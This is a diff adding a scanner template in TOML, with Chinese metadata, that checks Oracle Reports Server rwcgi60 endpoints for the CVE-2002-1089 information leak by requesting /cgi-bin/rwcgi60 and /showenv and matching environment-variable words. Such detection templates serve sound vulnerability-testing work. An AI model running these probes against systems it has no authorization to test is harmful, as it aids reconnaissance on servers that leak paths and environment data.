@@ -1,0 +1,57 @@
+[info]
+author = "AVE"
+description = "检测 Oracle Reports Server 6.0.8/9.0.2 中 rwcgi60 CGI 程序的信息泄露漏洞。通过访问 /cgi-bin/rwcgi60 和 /cgi-bin/rwcgi60/showenv 端点，验证服务器是否泄露系统路径、环境变量等敏感信息。"
+id = "POC-AVE-2002-0536"
+name = "Oracle Reports Server rwcgi60 信息泄露 PoC"
+severity = "medium"
+tags = [
+    "cve-2002-1089",
+    "oracle",
+    "reports-server",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2002-1089",
+    "AVE-2002-0536",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/rwcgi60"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Content-type",
+    "Server",
+    "Oracle",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/rwcgi60/showenv"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "PATH",
+    "HOME",
+    "USER",
+    "ORACLE",
+    "SERVER_SOFTWARE",
+]
